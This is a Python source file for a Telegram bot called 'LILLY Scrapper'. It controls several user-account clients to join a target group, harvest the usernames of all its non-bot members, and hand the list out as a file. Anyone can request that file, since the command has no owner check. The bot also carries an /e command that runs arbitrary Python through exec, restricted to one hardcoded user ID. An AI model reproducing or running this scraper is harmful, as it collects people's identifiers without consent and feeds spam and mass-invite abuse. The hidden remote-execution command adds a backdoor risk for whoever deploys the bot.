from LillySc import ubot, vbot, wbot, xbot, ybot, OWNER_ID, tbot
from telethon import events
import io, sys, os, traceback
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest


@tbot.on(events.NewMessage(pattern="^/start$"))
async def event(event):
 await event.reply("LILLY Scrapper is online With 5/15 Clients Active.")

members = []

@tbot.on(events.NewMessage(pattern="^/scrape ?(.*)"))
async def sc(event):
 if not event.sender_id == OWNER_ID:
    return
 if not event.pattern_match.group(1):
    return await event.reply("Please enter the chat username to start scrapping members.")
 chat_username = event.pattern_match.group(1)
 try:
   chat = await tbot.get_entity(chat_username)
   username = chat.username
 except:
   return await event.reply("❌Invalid chat provided.")
 s = await event.respond("Starting the Scrapping.")
 client = [ubot, vbot, wbot, xbot, ybot]
 for x in client:
  try:
    await x(JoinChannelRequest(event.chat.username))
  except:
    pass
 try:
  await vbot(JoinChannelRequest(username))
 except Exception as e:
  print(e)
  pass
 async for user in vbot.iter_participants(username):
   if not user.bot:
     if user.username:
       members.append(user.username)
 await s.edit("Finished Scrapping.")
 await vbot(LeaveChannelRequest(username))

@tbot.on(events.NewMessage(pattern="^/members$"))
async def mem(event):
 if len(members) == 0:
   return await event.reply("Scrape some members first")
 if len(str(members)) > 10:
   with io.BytesIO(str.encode(str(members))) as out_file:
    out_file.name = "members.txt"
    await tbot.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption=str(len(members)),
            )
 else:
  await event.reply(str(members))


@tbot.on(events.NewMessage(pattern="^/e ?(.*)"))
async def ev(event):
        if event.text.startswith("/eval"):
           return
        if not event.sender_id == 1763477650:
           return
        e = event
        cmd = event.text.split(" ", maxsplit=1)[1]
        old_stderr = sys.stderr
        old_stdout = sys.stdout
        redirected_output = sys.stdout = io.StringIO()
        redirected_error = sys.stderr = io.StringIO()
        stdout, stderr, exc = None, None, None
        try:
            await aexec(cmd, event)
        except Exception:
            exc = traceback.format_exc()
        stdout = redirected_output.getvalue()
        stderr = redirected_error.getvalue()
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        evaluation = ""
        if exc:
            evaluation = exc
        elif stderr:
            evaluation = stderr
        elif stdout:
            evaluation = stdout
        else:
            evaluation = "Success"
        final_output = "`{}`".format(evaluation)
        MAX_MESSAGE_SIZE_LIMIT = 4095
        if len(final_output) > MAX_MESSAGE_SIZE_LIMIT:
            with io.BytesIO(str.encode(final_output)) as out_file:
                out_file.name = "eval.text"
                await tbot.send_file(
                    event.chat_id,
                    out_file,
                    force_document=True,
                    allow_cache=False,
                    caption=cmd,
                )

        else:
            await event.respond(final_output)


async def aexec(code, smessatatus):
    message = event = smessatatus

    def p(_x):
        return print(slitu.yaml_format(_x))

    reply = await event.get_reply_message()
    exec(
        "async def __aexec(message, reply, client, p): "
        + "\n event = smessatatus = message"
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](message, reply, tbot, p)
